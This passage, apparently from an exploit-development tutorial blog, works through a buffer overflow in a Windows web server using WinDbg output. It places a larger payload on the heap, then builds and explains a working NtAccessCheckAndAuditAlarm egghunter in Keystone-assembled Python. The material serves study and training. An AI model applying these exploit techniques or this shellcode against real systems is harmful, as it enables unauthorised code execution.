</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bfe60 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ea2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea78 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea24 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea78 <span style="color:#ae81ff">0f</span><span style="color:#ae81ff">8411000000</span>    je      <span style="color:#ae81ff">046</span>bea8f                                [br<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bfe60 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ea2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea8f esp<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea24 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea8f <span style="color:#ae81ff">41</span>              inc     ecx
</span></span></code></pre></div><p>We successfully landed on our code, but if we see closely, we land on a 2 byte offset:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dd <span style="color:#ae81ff">046</span>bea8f<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea8b  <span style="color:#ae81ff">41412f</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>This is not a problem as we can fix the offset, or add some NOPs before our shellcode in case that the offset is not consistent.
Once we know how to execute our code, the next step is to see if we have enough space.</p>
<p>After calculating how many &ldquo;A&quot;s does the buffer store, we see that the result is 251 bytes.
While generating a reverse shell payload in previous modules, the size of the resulting shellcode was over 300 bytes. A more advanced payload, such as a Meterpreter, would require even more space.
Even if we were to use the HTTP method buffer, rather than jumping over it, we would still not have enough space for a large payload.</p>
<p>Therefore, we have to find a way to store a larger shellcode in our current exploit.</p>
<h1 id="storing-the-shellcode-in-the-heap">Storing the shellcode in the heap</h1>
<p>We have to find a way to store the shellcode in other place of the application. Another option is to use a smaller payloads with fewer features, but this is a last resort.
We have to store our shellcode in a different memory region before the crash and then redirect the execution flow to that additional buffer. We will use the space we already have to create a &ldquo;stager&rdquo; shellcode that jumps to this second memory region, once we find it.
To determine what will be stored in memory by our vulnerable application, we could either perform a very in-depth reverse engineering process on the application, or we could make some educated guesses based on the type of application we are attacking.
In the case of this application, a web server, we could do two things:</p>
<ul>
<li>Rather than terminating the HTTP request with <code>\r\n</code>, we can try to add an additional buffer between the carriage return and the new line. <strong>Doing this results in the application not crashing, which means that this method does not work here.</strong></li>
<li>Sending a buffer after we end the HTTP request (after <code>\r\n</code>). Doing this results in hitting our POP, RET breakpoint and in a crash, so we will stick to this method.</li>
</ul>
<p>Once we manage to add another shellcode of a bigger space (400 bytes), we need to find where is it stored in memory. For that, some bytes of the shellcode have been given a special value (in my case &ldquo;w00tw00t&rdquo;) so it is possible to find them.
Now, let&rsquo;s find this bytes once we hit the breakpoint:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>a86  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  w00tw00tAAAAAAAA
</span></span></code></pre></div><p>Seems that we were able to locate our payload. Now, let&rsquo;s see if the shellcode is complete by adding 400 bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>a86 <span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>n400
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>c16  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  AAAAAAAA........
</span></span></code></pre></div><p>After a 400 bytes offset, our payload is stored still. That means that we can store our complete buffer here as we have space.
<strong>Now, let&rsquo;s see where this buffer is stored.</strong></p>
<p>Let&rsquo;s check if it is in the stack of the thread:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">002</span>bc000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">02</span>d4ff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">02</span>d50000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">02</span>d4c000
</span></span></code></pre></div><p>Surprising, it is not in the current stack.
Let&rsquo;s use an extension from WinDbg called !address that tells us in which memory region our shellcode is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>address <span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>a86  
</span></span><span style="display:flex;"><span>                                 
</span></span><span style="display:flex;"><span>Mapping file section regions...
</span></span><span style="display:flex;"><span>Mapping module regions...
</span></span><span style="display:flex;"><span>Mapping PEB regions...
</span></span><span style="display:flex;"><span>Mapping TEB and stack regions...
</span></span><span style="display:flex;"><span>Mapping heap regions...
</span></span><span style="display:flex;"><span>Mapping page heap regions...
</span></span><span style="display:flex;"><span>Mapping other regions...
</span></span><span style="display:flex;"><span>Mapping stack trace database regions...
</span></span><span style="display:flex;"><span>Mapping activation context regions...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Usage:                  Heap
</span></span><span style="display:flex;"><span>Base Address:           <span style="color:#ae81ff">01</span><span style="color:#ae81ff">800000</span>
</span></span><span style="display:flex;"><span>End Address:            <span style="color:#ae81ff">0180f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>Region Size:            <span style="color:#ae81ff">0000f</span><span style="color:#ae81ff">000</span> (  <span style="color:#ae81ff">60.000</span> kB)
</span></span><span style="display:flex;"><span>State:                  <span style="color:#ae81ff">00001000</span>          MEM_COMMIT
</span></span><span style="display:flex;"><span>Protect:                <span style="color:#ae81ff">00000004</span>          PAGE_READWRITE
</span></span><span style="display:flex;"><span>Type:                   <span style="color:#ae81ff">00020000</span>          MEM_PRIVATE
</span></span><span style="display:flex;"><span>Allocation Base:        <span style="color:#ae81ff">01</span><span style="color:#ae81ff">800000</span>
</span></span><span style="display:flex;"><span>Allocation Protect:     <span style="color:#ae81ff">00000004</span>          PAGE_READWRITE
</span></span><span style="display:flex;"><span>More info:              heap owning the address: <span style="color:#f92672">!</span>heap <span style="color:#ae81ff">0x1800000</span>
</span></span><span style="display:flex;"><span>More info:              heap segment
</span></span><span style="display:flex;"><span>More info:              heap entry containing the address: <span style="color:#f92672">!</span>heap <span style="color:#f92672">-</span>x <span style="color:#ae81ff">0x1805a86</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Content source: <span style="color:#ae81ff">1</span> (target), length: <span style="color:#ae81ff">957</span>a
</span></span></code></pre></div><p>According to this output, our buffer is stored on the <strong>heap.</strong>
In Windows operating systems, when a process starts, the Heap Manager automatically creates a new heap called the default process heap. At a very high level, heaps are big chunks of memory that are divided into smaller pieces to fulfill dynamic memory allocation requests.
Although some processes only use the default process heap, many will create additional heaps using the HeapCreate API (or its lower-level interface ntdll!RtlCreateHeap) to isolate different components running in the process itself.
Several user-space Windows APIs (VirtualAllocEx, VirtualFreeEx, HeapAlloc, and HeapFree) will eventually call into their respective native functions in ntdll.dll (RtlAllocateHeap and RtlFreeHeap).
Other processes make substantial use of the C Runtime heap for most dynamic allocations (malloc / free functions). These heap implementations, defined as NT Heap, eventually make use of the Windows Heap Manager functions in ntdll.dll to interface with the kernel Windows Virtual Memory Manager and to allocate memory dynamically.</p>
<p>The summary is that <strong>there is no way to determine the location of the buffer before it is stored in memory.</strong> This rules out the possibility of adding a <strong>static offset, short jump, island hopping, or any of the previous techniques</strong> to make the instruction pointer jump to this location.</p>
<p>We need to explore other methods of finding the location of our buffer as it is stored in the heap dinamically. This is where the egghunter approach comes.</p>
<h1 id="egghunters">Egghunters</h1>
<h2 id="what-is-an-egghunter">What is an Egghunter</h2>
<p>When we need to <strong>find the memory address of another buffer under our control that does not take a static location, we often use an Egghunter.</strong>
The term Egghunter refers to a first-stage payload that can <strong>search the process virtual address space (VAS)</strong> for an egg, an unique tag that <strong>prepends</strong> the payload we want to execute. Once the egg (pattern) has been found, the egghunter transfers the execution to the shellcode by jumping to the found address.</p>
<p>Since egghunters are made to deal with space restrictions, they are written to be as small as possible. Also, the egghunting code needs to be fast, as, the fastest it executes, the less time the application hangs.
These type of payloads also need to be robust and handle access violations that are raised while scanning the virtual address space. The access violations usually occur while attempting to access an unmapped memory address or addresses we don’t have access to.
In the past, we would typically write the assembly code for our egghunter and then proceed to compile the code. After, we would disassemble the compiled binary in software such as IDA to get the opcodes for it. However, this is very consuming and we have a better alternative.</p>
<h2 id="keystone-engine">Keystone Engine</h2>
<p>Writing shellcode is much more streamlined using a tool like Keystone Engine. This tool is an assembler framework for several languages, like Python. With it, we can write our ASM code in a Python script and let the Keystone framework do the rest.
Installing Keystone in Kali is pretty straightforward once Python3 is installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install keystone-engine
</span></span><span style="display:flex;"><span>Collecting keystone-engine
</span></span><span style="display:flex;"><span>  Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl.metadata <span style="color:#f92672">(</span>1.8 kB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl <span style="color:#f92672">(</span>1.8 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 22.5 MB/s eta 0:00:00
</span></span><span style="display:flex;"><span>Installing collected packages: keystone-engine
</span></span><span style="display:flex;"><span>Successfully installed keystone-engine-0.9.2
</span></span></code></pre></div><p>For example, let&rsquo;s use this snippet of code for a x64 architecture in 32 bits:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; &#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; start: &#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; xor eax, eax ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add eax, ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push eax ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop esi ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in 32-bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)  
</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(CODE)  
</span></span><span style="display:flex;"><span>instructions <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dec <span style="color:#f92672">in</span> encoding:  
</span></span><span style="display:flex;"><span>    instructions <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{0:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(int(dec))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)  
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Opcodes = (</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> instructions <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><p>Now, if we execute this program, the following result is obtained, crafting the opcodes instruction by instruction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01\xc8</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01\xc8\x50</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01\xc8\x50\x5e</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Let&rsquo;s try to verify the opcodes using the tool that we already know called msf-nasm_shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf<span style="color:#f92672">-</span>nasm_shell                                                                                                 
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> xor eax, eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">31</span>C0              xor eax,eax
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> add eax, ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">01</span>C8              add eax,ecx
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> push eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">50</span>                push eax
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> pop esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">5</span>E                pop esi
</span></span></code></pre></div><p>As we can see, the opcodes returned from the tool are exactly the same, but the tool is much more flexible as we will be able to test our assembly code much faster.
Please note that while Keystone saves a large amount of time, it is not without fault.
Depending on the assembly code we are working with, some opcodes, like short jumps, may not be generated correctly. It&rsquo;s recommended going over the assembly instructions in memory (with a debugger) to confirm that the generated opcodes are correct.</p>
<h2 id="analyzing-a-public-egghunter">Analyzing a public Egghunter</h2>
<p>Remember that the Egghunter needs to go around all the VAS of a process in order to search for the &ldquo;egg&rdquo;.
Regarding this search, one of the issues egghunters must account for is the fact that there is no way of telling beforehand if a memory page is mapped, if it has the correct permissions to access it, or what kind of access is allowed on that memory page. If this is not handled correctly, we will generate an access violation and cause a crash.
To combat this issue, what Egghunter often do is check the protections or access policies of the memory region before inspecting it. In Windows, the NtAccessCheckAndAuditAlarm call is used, as it returns a different error code depending on the properties of the memory accessed. For example, the error code, STATUS_NO_IMPERSONATION_TOKEN (0xc000005c), is returned due to various checks made by the function before it attempts to use any of the provided arguments.
<strong>Note: NtAccessCheckAndAuditAlarm will work without issues in the egghunter unless we are running in the context of a thread that is impersonating a client. In these cases, it might not work as expected by our egghunter code.</strong></p>
<p>Because the public egghunter that we will analyze uses such system call, let&rsquo;s first explain what are system calls (often called <em>syscalls</em>). A syscall is basically an interface between the user-mode process and the kernel. Invoking a system call is often done through a special assembly instruction or an interrumpt (also known as trap or exception). Whenever these actions are done, the operating system takes over, performs the proper operation (in kernel context) and returns to the running software with the result of the operation.</p>
<p>The egghunter that we analyze here will take advantage of this. Rather than crawling the memory inside our program, in risk of an access violation that could break the program, it uses a syscall with a specific memory address in order to inspect its properties.
Before the desired function is called, the operating system will attempt to copy the arguments we provide in user-space, to kernel-space.
If the memory address where the function arguments reside is not mapped, or if we don’t have the appropriate access, the copy operation will cause an access violation. The access violation will be handled in the background and then return a STATUS_ACCESS_VIOLATION code (0xc0000005), allowing our egghunter to continue to the next memory page.</p>
<p>Before we use a system call, the operating system needs to know which function it should call, as well as its parameters. In the case of x86, the function to use is specified by setting up a unique System Call Number in the EAX register, each of the numbers being mapped to a specific function. then, the arguments are pushed into the stack, and the stack pointer (ESP) is moved to the EDX register, as it is used by the system call.</p>
<p>As part of the system call, the operating system will try to access the memory address where the address have been stored, to copy them from user-space to kernel space. If EDX points to <strong>an unmapped memory address, or one we can&rsquo;t access due to lack of permissions, the operating system will trigger an access violation, which it will handle for us and return the <code>STATUS_ACCESS_VIOLATION</code></strong> code in EAX.
Therefore, by using the NtAccessCheckAndAuditAlarm system call, we will only get two results:</p>
<ul>
<li>If the memory page we check is valid and we have appropiate access, the system call will return STATUS_NO_IMPERSONATION_TOKEN.</li>
<li>If we access an unmapped memory page or one without appropiate access we will obtain a STATUS_ACCESS_VIOLATION code.
This is why this system call is interesting for the egghunter as we can use it to enumerate the memory pages in which we have access to and are mapped.</li>
</ul>
<p>Now that we have a basic understanding of what mechanisms the egghunter technique abuses, let’s examine the code below and find out how to implement it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># We use the edx register as a memory page counter  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; &#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Go to the last address in the memory page  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or dx, 0x0fff ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Increase the memory counter by one  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc edx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Save the edx register which holds our memory  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># address on the stack</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Push the system call number  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x2 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Initialize the call to NtAccessCheckAndAuditAlarm  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Perform the system call  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; int 0x2e ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Check for access violation, 0xc0000005  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># (ACCESS_VIOLATION)</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; cmp al,05 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Restore the edx register to check later  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># for our egg</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop edx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check_valid: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># If access violation encountered, go to next page</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; je loop_inc_page ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Load egg (w00t in this example) into  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># the eax register</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Initializes pointer with current checked  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># address</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov edi, edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Compare eax with doubleword at edi and  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># set status flags</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># No match, we will increase our memory  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># counter by one</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># First part of the egg detected, check for  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># the second part</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># No match, we found just a location  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># with half an egg</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; matched: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># The edi register points to the first  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># byte of our buffer, we can jump to it</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in 32bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)  
</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(CODE)  
</span></span><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dec <span style="color:#f92672">in</span> encoding:  
</span></span><span style="display:flex;"><span> egghunter <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{0:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(int(dec))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;egghunter = (</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> egghunter <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><p>Let&rsquo;s analyze what does this egghunter code do part by part.</p>
